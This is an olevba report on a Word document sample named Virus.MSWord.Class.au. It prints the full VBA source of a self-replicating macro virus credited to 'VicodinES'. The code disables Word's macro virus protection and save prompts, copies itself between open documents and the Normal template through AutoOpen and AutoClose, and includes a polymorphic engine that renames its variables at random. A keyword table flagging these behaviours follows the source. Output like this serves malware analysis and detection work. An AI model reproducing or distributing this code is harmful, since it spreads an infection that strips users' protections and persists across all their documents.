olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.au-ffa3f4ac055bec715a8dac7e28c2f720e1f98167e58c51ce436e2afdd821393f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.au-ffa3f4ac055bec715a8dac7e28c2f720e1f98167e58c51ce436e2afdd821393f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Class.au-ffa3f4ac055bec715a8dac7e28c2f720e1f98167e58c51ce436e2afdd821393f - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-='
'  Class Macro Virus Generated By CPCK    '
'Demo For VAMP (Vic's Advanced Macro Poly)'
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-='
'         written by VicodinES            '
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-='
' *stand alone module and instructions    '
' *to be released seperatly               '
'=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-='

' CPCK Generated Virus Code

Sub AutoOpen()
On Error Resume Next
Options.ConfirmConversions = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
HC1160 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
HI6622 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set FK4228 = ActiveDocument.VBProject.VBComponents.Item(1)
UM5159 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set FK4228 = NormalTemplate.VBProject.VBComponents.Item(1)
FO6818 = True
Call TV4340_KP828
End If
If FO6818 <> True And UM5159 <> True Then GoTo PV979
If FO6818 = True Then FK4228.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, HC1160 - 1))
If UM5159 = True Then FK4228.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, HI6622 - 1))
PV979:
If HI6622 <> 0 And HC1160 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub

' Begin VAMP Code (Pass the variables to the VAMP Engine)

Private Sub TV4340_KP828()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "EJ996": r1(2) = "IR6428": r1(3) = "LH5529": r1(4) = "JS4287": r1(5) = "KP828": r1(6) = "HC1160"
r1(7) = "HI6622": r1(8) = "UM5159":: r1(9) = "FK4228": r1(10) = "FO6818": r1(11) = "PV979": r1(12) = "TV4340": r1(13) = "CC9720": r1(14) = "PN8648"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call KP828(a1, r1(x))
Next x
End Sub

' Begin VAMP Engine v1.0

Private Sub KP828(PN8648, CC9720 As String)
On Error Resume Next
Dim EJ996 As Long: Dim IR6428 As Long: Dim LH5529 As Long: Dim JS4287 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
EJ996 = 1: IR6428 = 1: LH5529 = .CountOfLines: JS4287 = Len(.Lines(.CountOfLines, 1))
Do While .Find(CC9720, EJ996, IR6428, LH5529, JS4287, True)
strline = .Lines(EJ996, 1)
strline = Left(strline, IR6428 - 1) & PN8648 & Mid(strline, JS4287)
.replaceline EJ996, strline
EJ996 = LH5529 + 1: IR6428 = 1: DD2134 = .CountOfLines
JS4287 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

